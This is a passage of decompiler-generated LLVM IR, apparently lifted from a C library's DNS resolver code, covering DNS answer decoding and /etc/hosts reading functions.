  %v0_1b4b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b4b8 = add i32 %v0_1b4b8, 4
  store i32 %v1_1b4b8, i32* %r0.global-to-local, align 4
  %v1_1b4bc = trunc i32 %v3_1b4b4 to i8
  %v2_1b4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_1b4bc = add i32 %v2_1b4bc, 3
  %v4_1b4bc = inttoptr i32 %v3_1b4bc to i8*
  store i8 %v1_1b4bc, i8* %v4_1b4bc, align 1
  %v2_1b4c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b4c0, i32* @r4, align 4
  store i32 %v6_1b468, i32* @r5, align 4
  store i32 %v9_1b468, i32* @r6, align 4
  ret i32 %v1_1b4b8

; uselistorder directives
  uselistorder i32 %v2_1b47c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1b468, { 1, 0, 2 }
  uselistorder i32 %v6_1b468, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1b4c8 = call i32 @__length_dotted()
  %v1_1b4cc = icmp slt i32 %v0_1b4c8, 0
  br i1 %v1_1b4cc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1b4d0 = add i32 %v0_1b4c8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1b4d4 = phi i32 [ %v0_1b4c8, %entry ], [ %v4_1b4d0, %bb ]
  ret i32 %v5_1b4d4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1b4d8 = load i32, i32* @r4, align 4
  %v6_1b4d8 = load i32, i32* @r5, align 4
  %v9_1b4d8 = load i32, i32* @r6, align 4
  %v12_1b4d8 = load i32, i32* @r7, align 4
  %v15_1b4d8 = load i32, i32* @r8, align 4
  %v21_1b4d8 = load i32, i32* @sl, align 4
  %v2_1b4dc = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1b4dc, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1b4f8 = call i32 @__decode_dotted()
  store i32 %v0_1b4f8, i32* %r0.global-to-local, align 4
  store i32 %v0_1b4f8, i32* @r7, align 4
  %v1_1b4fc = icmp slt i32 %v0_1b4f8, 0
  %v0_1b500 = load i32, i32* @r4, align 4
  %v2_1b500 = add i32 %v0_1b500, %v0_1b4f8
  store i32 %v2_1b500, i32* @r8, align 4
  br i1 %v1_1b4fc, label %bb14, label %dec_label_pc_1b510

dec_label_pc_1b510:                               ; preds = %entry
  %v1_1b508 = load i32, i32* @r5, align 4
  %v2_1b508 = sub i32 %v1_1b508, %v2_1b500
  %v1_1b510 = add i32 %v2_1b508, -10
  store i32 %v1_1b510, i32* @r5, align 4
  %v6_1b510 = icmp slt i32 %v1_1b510, 0
  store i32 %v2_1b4dc, i32* %r0.global-to-local, align 4
  %v0_1b518 = load i32, i32* @sl, align 4
  %v2_1b518 = add i32 %v0_1b518, %v2_1b500
  store i32 %v2_1b518, i32* @r4, align 4
  br i1 %v6_1b510, label %bb, label %dec_label_pc_1b524

bb:                                               ; preds = %dec_label_pc_1b510
  br label %bb14

dec_label_pc_1b524:                               ; preds = %dec_label_pc_1b510
  %v1_1b524 = bitcast i32* %stack_var_-288 to i8*
  %v2_1b524 = call i32 @__GI_strdup(i8* %v1_1b524)
  store i32 %v2_1b524, i32* %r0.global-to-local, align 4
  %v1_1b528 = load i32, i32* @r6, align 4
  %v2_1b528 = inttoptr i32 %v1_1b528 to i32*
  store i32 %v2_1b524, i32* %v2_1b528, align 4
  %v0_1b52c = load i32, i32* @sl, align 4
  %v1_1b52c = load i32, i32* @r8, align 4
  %v2_1b52c = add i32 %v1_1b52c, %v0_1b52c
  %v3_1b52c = inttoptr i32 %v2_1b52c to i8*
  %v4_1b52c = load i8, i8* %v3_1b52c, align 1
  %v6_1b52c = zext i8 %v4_1b52c to i32
  %v0_1b530 = load i32, i32* @r4, align 4
  %v1_1b530 = add i32 %v0_1b530, 1
  %v2_1b530 = inttoptr i32 %v1_1b530 to i8*
  %v3_1b530 = load i8, i8* %v2_1b530, align 1
  %v4_1b530 = zext i8 %v3_1b530 to i32
  %v4_1b534 = mul nuw nsw i32 %v6_1b52c, 256
  %v5_1b534 = or i32 %v4_1b530, %v4_1b534
  store i32 %v5_1b534, i32* %r3.global-to-local, align 4
  %v1_1b538 = load i32, i32* @r6, align 4
  %v2_1b538 = add i32 %v1_1b538, 4
  %v3_1b538 = inttoptr i32 %v2_1b538 to i32*
  store i32 %v5_1b534, i32* %v3_1b538, align 4
  %v0_1b53c = load i32, i32* @r4, align 4
  %v1_1b53c = add i32 %v0_1b53c, 2
  store i32 %v1_1b53c, i32* %r1.global-to-local, align 4
  %v2_1b540 = inttoptr i32 %v1_1b53c to i8*
  %v3_1b540 = load i8, i8* %v2_1b540, align 1
  %v4_1b540 = zext i8 %v3_1b540 to i32
  %v1_1b544 = add i32 %v0_1b53c, 3
  %v2_1b544 = inttoptr i32 %v1_1b544 to i8*
  %v3_1b544 = load i8, i8* %v2_1b544, align 1
  %v4_1b544 = zext i8 %v3_1b544 to i32
  %v4_1b548 = mul nuw nsw i32 %v4_1b540, 256
  %v5_1b548 = or i32 %v4_1b544, %v4_1b548
  store i32 %v5_1b548, i32* %r3.global-to-local, align 4
  %v1_1b54c = load i32, i32* @r6, align 4
  %v2_1b54c = add i32 %v1_1b54c, 8
  %v3_1b54c = inttoptr i32 %v2_1b54c to i32*
  store i32 %v5_1b548, i32* %v3_1b54c, align 4
  %v0_1b550 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b550 = add i32 %v0_1b550, 2
  %v1_1b554 = add i32 %v0_1b550, 3
  %v2_1b554 = inttoptr i32 %v1_1b554 to i8*
  %v3_1b554 = load i8, i8* %v2_1b554, align 1
  %v4_1b554 = zext i8 %v3_1b554 to i32
  store i32 %v4_1b554, i32* %r3.global-to-local, align 4
  %v2_1b558 = inttoptr i32 %v1_1b550 to i8*
  %v3_1b558 = load i8, i8* %v2_1b558, align 1
  %v4_1b558 = zext i8 %v3_1b558 to i32
  store i32 %v4_1b558, i32* %r0.global-to-local, align 4
  %v1_1b55c = add i32 %v0_1b550, 5
  %v2_1b55c = inttoptr i32 %v1_1b55c to i8*
  %v3_1b55c = load i8, i8* %v2_1b55c, align 1
  %v4_1b55c = zext i8 %v3_1b55c to i32
  %v3_1b560 = mul nuw nsw i32 %v4_1b554, 65536
  store i32 %v3_1b560, i32* %r3.global-to-local, align 4
  %v1_1b564 = add i32 %v0_1b550, 4
  %v2_1b564 = inttoptr i32 %v1_1b564 to i8*
  %v3_1b564 = load i8, i8* %v2_1b564, align 1
  %v4_1b564 = zext i8 %v3_1b564 to i32
  %v4_1b568 = mul nuw i32 %v4_1b558, 16777216
  %v5_1b568 = or i32 %v4_1b568, %v3_1b560
  %v2_1b56c = or i32 %v5_1b568, %v4_1b55c
  %v4_1b570 = mul nuw nsw i32 %v4_1b564, 256
  %v5_1b570 = or i32 %v2_1b56c, %v4_1b570
  store i32 %v5_1b570, i32* %r3.global-to-local, align 4
  %v1_1b574 = load i32, i32* @r6, align 4
  %v2_1b574 = add i32 %v1_1b574, 12
  %v3_1b574 = inttoptr i32 %v2_1b574 to i32*
  store i32 %v5_1b570, i32* %v3_1b574, align 4
  %v0_1b578 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b578 = add i32 %v0_1b578, 6
  %v2_1b578 = inttoptr i32 %v1_1b578 to i8*
  %v3_1b578 = load i8, i8* %v2_1b578, align 1
  %v4_1b578 = zext i8 %v3_1b578 to i32
  %v0_1b57c = load i32, i32* @r4, align 4
  %v1_1b57c = add i32 %v0_1b57c, 9
  %v2_1b57c = inttoptr i32 %v1_1b57c to i8*
  %v3_1b57c = load i8, i8* %v2_1b57c, align 1
  %v4_1b57c = zext i8 %v3_1b57c to i32
  %v1_1b580 = add i32 %v0_1b57c, 10
  store i32 %v1_1b580, i32* %r0.global-to-local, align 4
  %v4_1b584 = mul nuw nsw i32 %v4_1b578, 256
  %v5_1b584 = or i32 %v4_1b57c, %v4_1b584
  store i32 %v5_1b584, i32* %r3.global-to-local, align 4
  %v0_1b588 = load i32, i32* @r8, align 4
  %v1_1b588 = add i32 %v0_1b588, 10
  %v0_1b58c = load i32, i32* @r5, align 4
  %v1_1b590 = add nuw nsw i32 %v5_1b584, 10
  store i32 %v1_1b590, i32* %r1.global-to-local, align 4
  %v1_1b594 = load i32, i32* @r6, align 4
  %v2_1b594 = add i32 %v1_1b594, 24
  %v3_1b594 = inttoptr i32 %v2_1b594 to i32*
  store i32 %v1_1b588, i32* %v3_1b594, align 4
  %v0_1b598 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b598 = load i32, i32* @r6, align 4
  %v2_1b598 = add i32 %v1_1b598, 20
  %v3_1b598 = inttoptr i32 %v2_1b598 to i32*
  store i32 %v0_1b598, i32* %v3_1b598, align 4
  %v0_1b59c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b59c = load i32, i32* @r6, align 4
  %v2_1b59c = add i32 %v1_1b59c, 16
  %v3_1b59c = inttoptr i32 %v2_1b59c to i32*
  store i32 %v0_1b59c, i32* %v3_1b59c, align 4
  %v0_1b5a0 = load i32, i32* @r7, align 4
  %v1_1b5a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b5a0 = add i32 %v1_1b5a0, %v0_1b5a0
  %v5_1b5a4 = icmp slt i32 %v0_1b58c, %v5_1b584
  %.v2_1b5a0 = select i1 %v5_1b5a4, i32 -1, i32 %v2_1b5a0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1b524, %entry
  %v0_1b5a8 = phi i32 [ %.v2_1b5a0, %dec_label_pc_1b524 ], [ %v1_1b510, %bb ], [ %v0_1b4f8, %entry ]
  store i32 %v0_1b5a8, i32* %r0.global-to-local, align 4
  store i32 %v3_1b4d8, i32* @r4, align 4
  store i32 %v6_1b4d8, i32* @r5, align 4
  store i32 %v9_1b4d8, i32* @r6, align 4
  store i32 %v12_1b4d8, i32* @r7, align 4
  store i32 %v15_1b4d8, i32* @r8, align 4
  store i32 %v21_1b4d8, i32* @sl, align 4
  ret i32 %v0_1b5a8

; uselistorder directives
  uselistorder i32 %v0_1b5a8, { 1, 0 }
  uselistorder i32 %v5_1b584, { 1, 0, 2 }
  uselistorder i32 %v3_1b560, { 1, 0 }
  uselistorder i32 %v1_1b510, { 0, 2, 1 }
  uselistorder i32 %v0_1b4f8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 24, { 26, 27, 28, 2, 42, 34, 11, 12, 13, 14, 15, 10, 43, 3, 0, 29, 30, 31, 44, 16, 25, 17, 1, 32, 36, 37, 38, 39, 40, 41, 18, 35, 33, 24, 19, 20, 21, 22, 23, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1e9e8.953 to i32), i32* @r1, align 4
  %v0_1b5b8 = load i32, i32* @lr, align 4
  store i32 %v0_1b5b8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1eb0c.1049 to i32), i32* @r0, align 4
  %v3_1b5c0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1eb0c.1049 to i32), i32 ptrtoint (i32* @global_var_1e9e8.953 to i32))
  %v2_1b5c4 = icmp eq i32 %v3_1b5c0, 0
  store i32 ptrtoint (i32* @global_var_1e9e8.953 to i32), i32* @r1, align 4
  br i1 %v2_1b5c4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1b5c0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1eb18.1051 to i32), i32* @r0, align 4
  %v2_1b5d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1b5d4, i32* @lr, align 4
  %v3_1b5d8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1eb18.1051 to i32), i32 ptrtoint (i32* @global_var_1e9e8.953 to i32))
  ret i32 %v3_1b5d8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1e9e8.953 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1b5e8 = load i32, i32* @r4, align 4
  %v6_1b5e8 = load i32, i32* @r5, align 4
  %v12_1b5e8 = load i32, i32* @r7, align 4
  %v15_1b5e8 = load i32, i32* @r8, align 4
  %v21_1b5e8 = load i32, i32* @sl, align 4
  %v24_1b5e8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1b5f4 = sub i32 0, %tmp61
  %v1_1b5f8 = urem i32 %v1_1b5f4, 4
  store i32 %v1_1b5f8, i32* %ip.global-to-local, align 4
  %v2_1b5f8 = icmp eq i32 %v1_1b5f8, 0
  %v0_1b5fc = load i32, i32* @r2, align 4
  %v0_1b600 = load i32, i32* @r0, align 4
  %v0_1b604 = load i32, i32* @r1, align 4
  %v0_1b608 = load i32, i32* @r3, align 4
  store i32 %v0_1b608, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1b5f8, label %dec_label_pc_1b628, label %dec_label_pc_1b618

dec_label_pc_1b618:                               ; preds = %entry
  %v2_1b618 = sub i32 %tmp57, %v1_1b5f8
  %v3_1b618 = icmp ult i32 %tmp57, %v1_1b5f8
  br i1 %v3_1b618, label %dec_label_pc_1b8fc, label %dec_label_pc_1b620

dec_label_pc_1b620:                               ; preds = %dec_label_pc_1b618
  store i32 %v2_1b618, i32* %r2.global-to-local, align 4
  %v2_1b624 = add i32 %v1_1b5f8, %tmp61
  store i32 %v2_1b624, i32* @r4, align 4
  br label %dec_label_pc_1b628

dec_label_pc_1b628:                               ; preds = %entry, %dec_label_pc_1b620
  %v0_1b638 = phi i32 [ %tmp61, %entry ], [ %v2_1b624, %dec_label_pc_1b620 ]
  %v0_1b63c = phi i32 [ %tmp57, %entry ], [ %v2_1b618, %dec_label_pc_1b620 ]
  %tmp = icmp ult i32 %v0_1b63c, 32
  br i1 %tmp, label %dec_label_pc_1b8fc, label %dec_label_pc_1b630

dec_label_pc_1b630:                               ; preds = %dec_label_pc_1b628
  store i32 %v0_1b608, i32* %r0.global-to-local, align 4
  %v7_1b634 = icmp eq i32 %v0_1b608, 1
  %v1_1b638 = add i32 %v0_1b638, 32
  store i32 %v1_1b638, i32* @fp, align 4
  %v1_1b63c = add i32 %v0_1b63c, -32
  store i32 %v1_1b63c, i32* @r8, align 4
  br i1 %v7_1b634, label %dec_label_pc_1b768, label %dec_label_pc_1b644

dec_label_pc_1b644:                               ; preds = %dec_label_pc_1b630
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1b650 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1b650, align 4
  %tmp80 = icmp ult i32 %v1_1b63c, 4
  br i1 %tmp80, label %dec_label_pc_1b8fc, label %dec_label_pc_1b658

dec_label_pc_1b658:                               ; preds = %dec_label_pc_1b644
  %v0_1b658 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b658 = add i32 %v0_1b658, -36
  store i32 %v1_1b658, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1b658, 8
  br i1 %tmp81, label %dec_label_pc_1b8fc, label %dec_label_pc_1b664

dec_label_pc_1b664:                               ; preds = %dec_label_pc_1b658
  %v0_1b664 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1b664, 16
  br i1 %tmp82, label %dec_label_pc_1b8fc, label %dec_label_pc_1b66c

dec_label_pc_1b66c:                               ; preds = %dec_label_pc_1b664
  %v1_1b66c = add i32 %v0_1b658, -48
  store i32 %v1_1b66c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1b66c, 8
  br i1 %tmp83, label %dec_label_pc_1b8fc, label %dec_label_pc_1b678

dec_label_pc_1b678:                               ; preds = %dec_label_pc_1b66c
  %v1_1b678 = add i32 %v0_1b658, -44
  store i32 %v1_1b678, i32* @r8, align 4
  %v1_1b67c = add i32 %v0_1b658, -56
  store i32 %v1_1b67c, i32* %r3.global-to-local, align 4
  %v3_1b680 = icmp ult i32 %v1_1b67c, %v1_1b678
  br i1 %v3_1b680, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1b678
  %v1_1b688 = load i32, i32* @r4, align 4
  %v2_1b688 = add i32 %v1_1b688, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1b678
  store i32 %v1_1b67c, i32* @r8, align 4
  %v1_1b68c.pre = load i32, i32* @r4, align 4
  %v2_1b68c = add i32 %v1_1b68c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1b68c, %.thread1 ], [ %v2_1b688, %bb ]
  %v0_1b694 = phi i32 [ %v1_1b68c.pre, %.thread1 ], [ %v1_1b688, %bb ]
  %v0_1b690 = phi i32 [ %v1_1b67c, %.thread1 ], [ %v1_1b678, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1b694 = add i32 %v0_1b694, 36
  store i32 %v1_1b694, i32* @r6, align 4
  %v1_1b698 = add i32 %v0_1b694, 48
  store i32 %v1_1b698, i32* @sl, align 4
  %tmp84 = icmp ult i32 %v0_1b690, 80
  br i1 %tmp84, label %dec_label_pc_1b8fc, label %dec_label_pc_1b6a0

dec_label_pc_1b6a0:                               ; preds = %bb74
  %v0_1b6a0 = call i32 @__open_etc_hosts()
  store i32 %v0_1b6a0, i32* %r0.global-to-local, align 4
  %v2_1b6a4 = icmp eq i32 %v0_1b6a0, 0
  br i1 %v2_1b6a4, label %dec_label_pc_1b6c0, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b6a0
  %v1_1b6ac = load i32, i32* @fp, align 4
  store i32 %v1_1b6ac, i32* @r7, align 4
  %v1_1b6b0 = load i32, i32* @r5, align 4
  store i32 %v1_1b6b0, i32* @fp, align 4
  %v1_1b6b4 = load i32, i32* @r6, align 4
  %v1_1b6b8 = load i32, i32* @sl, align 4
  br label %dec_label_pc_1b774

dec_label_pc_1b6c0:                               ; preds = %dec_label_pc_1b6a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1b6c8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1b6c8, align 4
  %v0_1b6cc = call i32 @__errno_location()
  store i32 %v0_1b6cc, i32* %r0.global-to-local, align 4
  %v1_1b6d0 = inttoptr i32 %v0_1b6cc to i32*
  %v2_1b6d0 = load i32, i32* %v1_1b6d0, align 4
  store i32 %v2_1b6d0, i32* @sl, align 4
  br label %dec_label_pc_1b900

dec_label_pc_1b6d8:                               ; preds = %dec_label_pc_1b888
  %v0_1b6d8 = load i32, i32* @r4, align 4
  %v1_1b6d8 = add i32 %v0_1b6d8, 4
  %v2_1b6d8 = inttoptr i32 %v1_1b6d8 to i32*
  %v3_1b6d8 = load i32, i32* %v2_1b6d8, align 4
  %v1_1b6dc = load i32, i32* @sb, align 4
  %v2_1b6dc = inttoptr i32 %v1_1b6dc to i32*
  store i32 %v3_1b6d8, i32* %v2_1b6dc, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b6f0 = load i32, i32* @r4, align 4
  %v1_1b6f0 = add i32 %v0_1b6f0, 8
  store i32 %v1_1b6f0, i32* %r1.global-to-local, align 4
  %v1_1b6f4 = load i32, i32* @sb, align 4
  %v2_1b6f4 = add i32 %v1_1b6f4, 8
  %v3_1b6f4 = inttoptr i32 %v2_1b6f4 to i32*
  store i32 2, i32* %v3_1b6f4, align 4
  %v0_1b6f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b6f8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1b700 = load i32, i32* @sb, align 4
  %v1_1b700 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b700 = inttoptr i32 %v1_1b700 to i32*
  store i32 %v0_1b700, i32* %v2_1b700, align 4
  %v0_1b704 = load i32, i32* @r7, align 4
  %v1_1b704 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b704 = inttoptr i32 %v1_1b704 to i32*
  store i32 %v0_1b704, i32* %v2_1b704, align 4
  %v0_1b708 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b708 = load i32, i32* @sb, align 4
  %v2_1b708 = add i32 %v1_1b708, 12
  %v3_1b708 = inttoptr i32 %v2_1b708 to i32*
  store i32 %v0_1b708, i32* %v3_1b708, align 4
  %v0_1b70c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b70c = load i32, i32* @sb, align 4
  %v2_1b70c = add i32 %v1_1b70c, 16
  %v3_1b70c = inttoptr i32 %v2_1b70c to i32*
  store i32 %v0_1b70c, i32* %v3_1b70c, align 4
  %v0_1b710 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b710 = load i32, i32* @sb, align 4
  %v2_1b710 = add i32 %v1_1b710, 4
  %v3_1b710 = inttoptr i32 %v2_1b710 to i32*
  store i32 %v0_1b710, i32* %v3_1b710, align 4
  %v0_1b714 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b714 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b714 = add i32 %v1_1b714, 4
  %v3_1b714 = inttoptr i32 %v2_1b714 to i32*
  store i32 %v0_1b714, i32* %v3_1b714, align 4
  br label %dec_label_pc_1b8e4

dec_label_pc_1b71c:                               ; preds = %dec_label_pc_1b8b0
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b720 = load i32, i32* @r4, align 4
  %v1_1b720 = add i32 %v0_1b720, 4
  %v2_1b720 = inttoptr i32 %v1_1b720 to i32*
  %v3_1b720 = load i32, i32* %v2_1b720, align 4
  store i32 %v3_1b720, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1b728 = load i32, i32* @sb, align 4
  %v2_1b728 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1b728, i32* %v2_1b728, align 4
  store i32 %v0_1b780, i32* %ip.global-to-local, align 4
  %v0_1b730 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b730 = load i32, i32* @sb, align 4
  %v2_1b730 = inttoptr i32 %v1_1b730 to i32*
  store i32 %v0_1b730, i32* %v2_1b730, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1b73c = load i32, i32* %ip.global-to-local, align 4
  %v1_1b73c = load i32, i32* %r0.global-to-local, align 4
  %v2_1b73c = inttoptr i32 %v1_1b73c to i32*
  store i32 %v0_1b73c, i32* %v2_1b73c, align 4
  %v0_1b740 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b740 = load i32, i32* @sb, align 4
  %v2_1b740 = add i32 %v1_1b740, 12
  %v3_1b740 = inttoptr i32 %v2_1b740 to i32*
  store i32 %v0_1b740, i32* %v3_1b740, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1b74c = load i32, i32* @r4, align 4
  %v1_1b74c = add i32 %v0_1b74c, 8
  store i32 %v1_1b74c, i32* %r1.global-to-local, align 4
  %v0_1b750 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b750, i32* @sl, align 4
  %v1_1b754 = load i32, i32* @sb, align 4
  %v2_1b754 = add i32 %v1_1b754, 8
  %v3_1b754 = inttoptr i32 %v2_1b754 to i32*
  store i32 10, i32* %v3_1b754, align 4
  %v0_1b758 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b758 = load i32, i32* @sb, align 4
  %v2_1b758 = add i32 %v1_1b758, 16
  %v3_1b758 = inttoptr i32 %v2_1b758 to i32*
  store i32 %v0_1b758, i32* %v3_1b758, align 4
  %v0_1b75c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b75c = load i32, i32* @sb, align 4
  %v2_1b75c = add i32 %v1_1b75c, 4
  %v3_1b75c = inttoptr i32 %v2_1b75c to i32*
  store i32 %v0_1b75c, i32* %v3_1b75c, align 4
  %v0_1b760 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b760 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b760 = add i32 %v1_1b760, 4
  %v3_1b760 = inttoptr i32 %v2_1b760 to i32*
  store i32 %v0_1b760, i32* %v3_1b760, align 4
  br label %dec_label_pc_1b8e4

dec_label_pc_1b768:                               ; preds = %dec_label_pc_1b630
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1b774

dec_label_pc_1b774:                               ; preds = %.thread, %dec_label_pc_1b768
  %v2_1b784.pre-phi = phi i32* [ %v2_1b650, %.thread ], [ %.pre, %dec_label_pc_1b768 ]
  %v0_1b780 = phi i32 [ %v1_1b6ac, %.thread ], [ 0, %dec_label_pc_1b768 ]
  %stack_var_-40.1 = phi i32 [ %v1_1b6b8, %.thread ], [ 0, %dec_label_pc_1b768 ]
  %stack_var_-48.1 = phi i32 [ %v1_1b6b4, %.thread ], [ 0, %dec_label_pc_1b768 ]
  %stack_var_-52.0 = phi i32 [ %v0_1b6a0, %.thread ], [ %v0_1b600, %dec_label_pc_1b768 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1b784.pre-phi, align 4
  %v2_1b848 = inttoptr i32 %v0_1b604 to i8*
  %v7_1b880 = icmp eq i32 %v0_1b5fc, 2
  %v7_1b8a8 = icmp eq i32 %v0_1b5fc, 10
  br label %dec_label_pc_1b8cc

dec_label_pc_1b78c:                               ; preds = %dec_label_pc_1b8cc
  %v0_1b78c = load i32, i32* @fp, align 4
  store i32 %v0_1b78c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1b794 = call i32 @__GI_strchr(i32 %v0_1b78c, i32 35)
  store i32 %v2_1b794, i32* %r0.global-to-local, align 4
  %v3_1b798 = icmp eq i32 %v2_1b794, 0
  br i1 %v3_1b798, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1b78c
  %v0_1b7a011 = load i32, i32* @fp, align 4
  store i32 %v0_1b7a011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1b80c.preheader

bb75:                                             ; preds = %dec_label_pc_1b78c
  %v3_1b794 = inttoptr i32 %v2_1b794 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b7a0 = load i32, i32* @fp, align 4
  store i32 %v0_1b7a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1b794, align 1
  %v0_1b80c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b80c.preheader

dec_label_pc_1b80c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1b80c30 = phi i32 [ %v0_1b80c30.pre, %bb75 ], [ %v0_1b7a011, %.thread10 ]
  %v1_1b80c31 = inttoptr i32 %v0_1b80c30 to i8*
  %v2_1b80c32 = load i8, i8* %v1_1b80c31, align 1
  %v3_1b80c33 = zext i8 %v2_1b80c32 to i32
  store i32 %v3_1b80c33, i32* %r3.global-to-local, align 4
  %v2_1b81034 = icmp eq i8 %v2_1b80c32, 0
  br i1 %v2_1b81034, label %dec_label_pc_1b818, label %dec_label_pc_1b7b8.preheader

dec_label_pc_1b7b0:                               ; preds = %dec_label_pc_1b7c4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1b7b4 = inttoptr i32 %v8_1b7dc to i8*
  store i8 0, i8* %v3_1b7b4, align 1
  %v4_1b7b4 = load i32, i32* %r2.global-to-local, align 4
